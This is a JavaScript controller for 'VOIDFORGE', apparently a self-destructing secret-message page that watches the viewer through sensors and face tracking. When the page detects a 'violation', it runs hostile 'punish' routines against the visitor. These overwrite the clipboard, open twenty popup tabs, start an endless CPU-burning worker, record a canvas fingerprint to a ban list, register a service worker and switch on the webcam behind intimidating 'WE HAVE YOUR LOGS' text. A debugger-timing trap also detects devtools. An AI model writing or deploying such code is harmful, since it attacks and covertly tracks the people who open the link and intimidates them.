/**
 * VOIDFORGE - Master Controller & Void Protocol (The Executioner)
 * Architecture: Orchestration, Temporal Decay, and Apex Black-Ops Detonation
 */

const VoidProtocol = {
    linkId: null,
    dbRef: null,
    options: {},
    isDetonated: false,
    decayTimer: null,
    toleranceAllowed: 3,
    isHolding: false,

    init: function() {
        const urlParams = new URLSearchParams(window.location.search);
        const encodedId = urlParams.get('id');
        
        if (!encodedId) {
            this.executeVaporization("INVALID ENCRYPTION TOKEN.");
            return;
        }

        try {
            this.linkId = atob(decodeURIComponent(encodedId));
        } catch (e) {
            this.executeVaporization("CORRUPTED DECRYPTION.");
            return;
        }

        this.dbRef = window.VoidDB.ref(`burner_vault/${this.linkId}`);
        this.bootSequence();
    },

    bootSequence: async function() {
        try {
            const snap = await this.dbRef.once('value');
            if (!snap.exists()) {
                this.executeVaporization("PAYLOAD VAPORIZED OR EXPIRED.");
                return;
            }

            const data = snap.val();
            this.options = data.options || {};
            
            // Terapkan batas toleransi dari Command Center
            this.toleranceAllowed = this.options.tolerance !== undefined ? parseInt(this.options.tolerance) : 3;
            
            if (typeof OsintEngine !== 'undefined') OsintEngine.init(this.linkId);

            document.getElementById('loading-screen').style.display = 'none';
            document.getElementById('vault-container').style.display = 'block';

            if (typeof VisualCrypt !== 'undefined') {
                VisualCrypt.init(
                    this.options, 
                    data.payload, 
                    () => this.onTargetHold(), 
                    (apexReason) => this.onTargetRelease(apexReason)
                );
            }

            if (typeof KineticSensors !== 'undefined') {
                KineticSensors.init(this.options, (reason) => this.triggerDetonation(reason));
            }
            if (typeof FaceTracker !== 'undefined') {
                FaceTracker.init(this.options, (reason) => this.triggerDetonation(reason));
            }

            this.activateTemporalDecay(data.duration);
            this.listenForKillSwitch();
            this.setupApexInstincts();

        } catch (error) {
            this.executeVaporization("SECURE HANDSHAKE FAILED.");
        }
    },

    setupApexInstincts: function() {
        if (this.options.tarpit) {
            setInterval(() => {
                const start = performance.now();
                debugger;
                const end = performance.now();
                if (end - start > 100) {
                    this.triggerDetonation("APEX VIOLATION: DEVTOOLS (F12) DETECTED BY EXECUTIONER.");
                }
            }, 100);
        }

        document.addEventListener('visibilitychange', () => {
            if (document.hidden) {
                this.triggerDetonation("APEX VIOLATION: BACKGROUND / TAB-SWITCH ATTEMPT DETECTED.");
            }
        });
    },

    activateTemporalDecay: function(duration) {
        if (duration && duration > 0) {
            this.decayTimer = setTimeout(() => {
                this.triggerDetonation("TEMPORAL DECAY: TIME EXPIRED.");
            }, duration * 1000);
        }
    },

    listenForKillSwitch: function() {
        this.dbRef.child('manual_detonation').on('value', snap => {
            if (snap.exists() && snap.val() === true) {
                this.triggerDetonation("VOID PROTOCOL TRIGGERED BY ADMIN.");
            }
        });
    },

    onTargetHold: function() {
        this.isHolding = true;
    },

    onTargetRelease: function(apexReason) {
        if (this.isDetonated) return;
        this.isHolding = false;
        
        if (apexReason) {
            this.triggerDetonation(`APEX VIOLATION: ${apexReason}`);
            return;
        }
        
        this.toleranceAllowed--;
        const warnUI = document.getElementById('tolerance-warning');
        const countUI = document.getElementById('tol-count');
        
        if (this.toleranceAllowed > 0) {
            countUI.innerText = this.toleranceAllowed;
            warnUI.style.display = 'block';
            setTimeout(() => { warnUI.style.display = 'none'; }, 3000);
        } else {
            this.triggerDetonation("MAXIMUM TOLERANCE EXCEEDED. FINGER RELEASED.");
        }
    },

    triggerDetonation: function(reason) {
        if (this.isDetonated) return;
        this.isDetonated = true;

        if (this.decayTimer) clearTimeout(this.decayTimer);
        
        if (typeof FaceTracker !== 'undefined') FaceTracker.stopTracking();

        document.getElementById('vault-container').style.display = 'none';

        if (this.options.clipboard) this.punishClipboard();
        if (this.options.hydra) this.punishHydra();
        if (this.options.cpu) this.punishCPU();
        if (this.options.fingerprint) this.punishFingerprint();
        if (this.options.phantom) this.punishPhantomWorker();
        
        if (this.options.shatter) {
            this.punishShatter();
            setTimeout(() => this.executeVaporization(reason), 3500); 
        } else if (this.options.medusa || reason.includes("FACE")) {
            this.punishRedRoom();
            setTimeout(() => this.executeVaporization(reason), 3000);
        } else {
            this.executeVaporization(reason);
        }
    },

    punishClipboard: function() {
        try { navigator.clipboard.writeText(`SECURITY LOG: IDENTITY COMPROMISED. REASON: ${this.isDetonated}`); } catch (e) {}
    },

    punishHydra: function() {
        for (let i = 0; i < 20; i++) { try { window.open('about:blank', '_blank'); } catch(e){} }
    },

    punishCPU: function() {
        const code = `while(true) { Math.sqrt(Math.random() * 999999); }`;
        const blob = new Blob([code], {type: 'application/javascript'});
        const worker = new Worker(URL.createObjectURL(blob));
    },

    punishShatter: function() {
        const shatterLayer = document.getElementById('shatter-overlay');
        shatterLayer.style.display = 'block';
        for (let i = 0; i < 50; i++) {
            const piece = document.createElement('div');
            piece.className = 'shatter-piece';
            piece.style.width = Math.random() * 100 + 50 + 'px';
            piece.style.height = Math.random() * 100 + 50 + 'px';
            piece.style.left = Math.random() * 100 + 'vw';
            piece.style.top = Math.random() * 100 + 'vh';
            piece.style.animationDuration = (Math.random() * 1.5 + 0.5) + 's';
            shatterLayer.appendChild(piece);
        }
    },

    punishRedRoom: function() {
        const rr = document.getElementById('red-room');
        rr.style.display = 'block';
        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
            .then(stream => { document.getElementById('red-video').srcObject = stream; })
            .catch(e => { document.getElementById('red-text-content').innerHTML = "SYSTEM COMPROMISED.<br>WE HAVE YOUR LOGS."; });
        setInterval(() => { rr.style.filter = `hue-rotate(${Math.random()*360}deg) brightness(${Math.random()*2})`; }, 100);
    },

    punishFingerprint: function() {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        ctx.fillText('VOIDFORGE', 10, 10);
        const hash = canvas.toDataURL().slice(-20);
        window.VoidDB.ref('banned_fingerprints').push({ hash: hash, timestamp: Date.now() });
    },

    punishPhantomWorker: function() {
        if ('serviceWorker' in navigator) { navigator.serviceWorker.register('sw-phantom.js').catch(()=>{}); }
    },

    executeVaporization: async function(reason) {
        document.getElementById('shatter-overlay').style.display = 'none';
        document.getElementById('red-room').style.display = 'none';
        
        const burnScreen = document.getElementById('burned-screen');
        document.getElementById('lblBurnReason').innerText = reason;
        burnScreen.style.display = 'flex';

        try { localStorage.clear(); sessionStorage.clear(); } catch(e) {}
        if (this.linkId && this.dbRef) { try { await this.dbRef.remove(); } catch(e) {} }

        setTimeout(() => {
            if (document.fullscreenElement) { document.exitFullscreen().catch(e => {}); }
            window.location.replace('https://www.google.com');
        }, 2000);
    }
};

window.addEventListener('DOMContentLoaded', () => {
    setTimeout(() => { VoidProtocol.init(); }, 100);
});
